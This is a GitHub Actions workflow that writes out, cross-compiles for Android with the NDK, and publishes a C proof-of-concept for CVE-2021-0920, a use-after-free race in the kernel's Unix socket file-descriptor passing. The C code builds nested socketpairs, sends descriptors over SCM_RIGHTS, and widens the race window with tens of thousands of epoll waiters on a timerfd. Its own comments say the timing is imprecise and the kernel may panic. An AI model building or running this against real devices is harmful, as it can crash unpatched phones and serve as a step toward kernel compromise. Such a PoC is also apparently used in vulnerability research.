name: build_cve_2021_0920_poc_v3_timerfd
on: [push, workflow_dispatch]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Android NDK
        uses: nttld/setup-ndk@v1
        id: setup-ndk
        with:
          ndk-version: r27c
          add-to-path: true

      - name: Write PoC source with timerfd
        run: |
          cat << 'EOF' > poc.c
          #define _GNU_SOURCE
          #include <fcntl.h>
          #include <pthread.h>
          #include <sched.h>
          #include <stdio.h>
          #include <stdlib.h>
          #include <string.h>
          #include <sys/epoll.h>
          #include <sys/socket.h>
          #include <sys/timerfd.h>
          #include <sys/types.h>
          #include <time.h>
          #include <unistd.h>

          #define __int64 long
          #define __int8 char
          #define EPOLL_COUNT 50000

          int sv[2];
          int epfd;
          int tfd;

          static void send_fd(int socket, int fd) {
              struct msghdr msg = {0};
              char buf[CMSG_SPACE(sizeof(fd))];
              memset(buf, '\0', sizeof(buf));
              struct iovec io = {.iov_base = "", .iov_len = 1};
              msg.msg_iov = &io;
              msg.msg_iovlen = 1;
              msg.msg_control = buf;
              msg.msg_controllen = sizeof(buf);
              struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
              cmsg->cmsg_level = SOL_SOCKET;
              cmsg->cmsg_type = SCM_RIGHTS;
              cmsg->cmsg_len = CMSG_LEN(sizeof(fd));
              *((int *)CMSG_DATA(cmsg)) = fd;
              msg.msg_controllen = CMSG_SPACE(sizeof(fd));
              sendmsg(socket, &msg, 0);
          }

          // Thread that sets up the race and triggers timerfd
          void *setup_race(void *arg) {
              int v5[710];
              int fd = socket(1, 1, 0);
              close(fd);
              usleep(0x61A80u);
              socketpair(1, 1, 0, sv);
              send_fd(sv[0], sv[1]);
              send_fd(sv[1], sv[0]);

              for (int i = 0; i <= 99; ++i) {
                  socketpair(1, 1, 0, &v5[2 * i + 510]);
                  for (int k = 0; k <= 4; ++k)
                      v5[5 * i + 10 + k] = socket(1, 1, 0);
              }
              for (int i = 0; i <= 99; ++i) {
                  send_fd(sv[0], v5[2 * i + 511]);
                  for (int k = 0; k <= 4; ++k) {
                      send_fd(v5[2 * i + 510], v5[5 * i + 10 + k]);
                      close(v5[5 * i + 10 + k]);
                  }
                  close(v5[2 * i + 511]);
                  close(v5[2 * i + 510]);
              }
              close(sv[0]);
              close(sv[1]);
              // After setup, trigger the timerfd to fire in the race window
              // (In a real exploit, this would be timed precisely)
              struct itimerspec its = { .it_value = { .tv_nsec = 1 } };
              timerfd_settime(tfd, 0, &its, NULL);
              return NULL;
          }

          int main() {
              // Create timerfd
              tfd = timerfd_create(CLOCK_MONOTONIC, 0);
              if (tfd < 0) { perror("timerfd_create"); return 1; }

              // Create epoll with many waiters
              epfd = epoll_create1(0);
              if (epfd < 0) { perror("epoll_create1"); return 1; }
              struct epoll_event ev = { .events = EPOLLIN };
              for (int i = 0; i < EPOLL_COUNT; i++) {
                  if (epoll_ctl(epfd, EPOLL_CTL_ADD, tfd, &ev) < 0) {
                      // Some kernels limit epoll count, ignore errors
                  }
              }

              // Run the race setup in a separate thread
              pthread_t th;
              for (int i = 0; i < 100; i++) {
                  if (socketpair(1, 1, 0, sv) != 0) continue;
                  pthread_create(&th, NULL, setup_race, NULL);
                  pthread_join(th, NULL);
                  // Check if we survived (if UAF happened, kernel may panic)
                  usleep(1000);
              }
              printf("PoC finished without crash (race may not have hit)\n");
              return 0;
          }
          EOF

      - name: Compile PoC
        env:
          ANDROID_NDK_HOME: ${{ steps.setup-ndk.outputs.ndk-path }}
        run: |
          $ANDROID_NDK_HOME/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang \
            -static -O2 -pthread poc.c -o poc
          file poc
          ls -la poc

      - uses: actions/upload-artifact@v4
        with:
          name: cve-2021-0920-poc-v3
          path: poc
